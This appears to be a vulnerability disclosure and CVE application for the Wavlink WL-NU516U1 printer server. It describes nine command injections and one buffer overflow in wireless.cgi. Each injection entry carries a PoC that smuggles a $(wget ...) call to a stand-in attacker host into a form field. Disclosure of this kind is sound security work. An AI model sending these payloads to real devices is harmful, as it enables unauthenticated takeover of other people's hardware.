# Wavlink WL-NU516U1 CVE Application Materials

## Common Fields
- Vendor: Wavlink
- Product: WL-NU516U1
- Version: M16U1_V240425
- Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A
- Advisory: https://github.com/Svigo-o/Wavlink_vul

---

## 1. GuestWifi Guest_password Command Injection
- Class: Command Injection
- Description: Wavlink WL-NU516U1 firmware M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi. When the page parameter is set to GuestWifi, the function sub_4032E4 reads the Guest_password POST parameter and passes it to sub_407504 which constructs a shell command via sprintf("iwpriv %s set %s=\"%s\"", ...) and executes it via system(). The input filter sub_4074A0 only blocks backtick and pipe characters, but $(cmd) syntax is not filtered, allowing arbitrary command execution. Authentication is not required.
- PoC: POST /cgi-bin/wireless.cgi body: page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_password=$(wget http://attacker:6666/callback)
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-guestwifi-guestpassword-command-injection

## 2. DeleteMac delete_al_mac Command Injection
- Class: Command Injection
- Description: Wavlink WL-NU516U1 firmware M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi. When page=DeleteMac, function sub_402D1C reads delete_al_mac POST parameter and passes it to del_mac.sh via sprintf, executed through system(). The $(cmd) syntax bypasses the input filter.
- PoC: POST /cgi-bin/wireless.cgi body: page=DeleteMac&delete_list=AA&delete_al_mac=$(wget http://attacker:6666/callback)
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-deletemac-deletealmac-command-injection

## 3. DeleteMac b_delete_list Command Injection
- Class: Command Injection
- Description: Same as above but via b_delete_list POST parameter in DeleteMac handler.
- PoC: POST /cgi-bin/wireless.cgi body: page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=$(wget http://attacker:6666/callback)
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-deletemac-bdeletelist-command-injection

## 4. DeleteMac b_delete_al_mac Command Injection
- Class: Command Injection
- Description: Same as above but via b_delete_al_mac POST parameter in DeleteMac handler.
- PoC: POST /cgi-bin/wireless.cgi body: page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=CC&b_delete_al_mac=$(wget http://attacker:6666/callback)
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-deletemac-bdeletealmac-command-injection

## 5. SetName NewName Command Injection
- Class: Command Injection
- Description: When page=SetName, function sub_403198 reads NewName POST parameter and passes it to change_name.sh via sprintf, executed through system(). The $(cmd) syntax bypasses the input filter.
- PoC: POST /cgi-bin/wireless.cgi body: page=SetName&mac_5g=AA:BB:CC:DD:EE:FF&NewName=$(wget http://attacker:6666/callback)
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-setname-newname-command-injection

## 6. multi_ssid SSID2G2 Command Injection
- Class: Command Injection
- Description: When page=multi_ssid, function sub_401D68 reads SSID2G2 POST parameter and passes it to set_bss.sh via sprintf, executed through system(). The $(cmd) syntax bypasses the input filter.
- PoC: POST /cgi-bin/wireless.cgi body: page=multi_ssid&wifi_multi_ssid=1&SSID2G2=$(wget http://attacker:6666/callback)&AuthMethod2=OPEN&EncrypType2=NONE
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-ssid2g2-command-injection

## 7. multi_ssid SSID5G2 Command Injection
- Class: Command Injection
- Description: Same handler as above, via SSID5G2 POST parameter.
- PoC: POST /cgi-bin/wireless.cgi body: page=multi_ssid&wifi_multi_ssid=1&SSID5G2=$(wget http://attacker:6666/callback)&AuthMethod2=OPEN&EncrypType2=NONE
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-ssid5g2-command-injection

## 8. multi_ssid AuthMethod2 Command Injection
- Class: Command Injection
- Description: Same handler as above, via AuthMethod2 POST parameter.
- PoC: POST /cgi-bin/wireless.cgi body: page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=$(wget http://attacker:6666/callback)&EncrypType2=NONE
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-authmethod2-command-injection

## 9. multi_ssid WPAPSK12 Command Injection
- Class: Command Injection
- Description: Same handler as above, via WPAPSK12 POST parameter.
- PoC: POST /cgi-bin/wireless.cgi body: page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=WPA2PSK&EncrypType2=AES&WPAPSK12=$(wget http://attacker:6666/callback)
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-wpapsk12-command-injection

## 10. GuestWifi Guest_ssid Buffer Overflow
- Class: Buffer Overflow
- Description: When page=GuestWifi, function sub_4032E4 reads Guest_ssid POST parameter and passes it to sub_407504 which uses sprintf(v8[1028], "iwpriv %s set %s=\"%s\"", ...) without bounds checking. A payload exceeding 1028 bytes overwrites the stack buffer, potentially allowing control of the return address ($ra register) on MIPS architecture.
- PoC: POST /cgi-bin/wireless.cgi body: page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_ssid=[1120 bytes of A's]
- Advisory: https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-guestwifi-guestssid-buffer-overflow
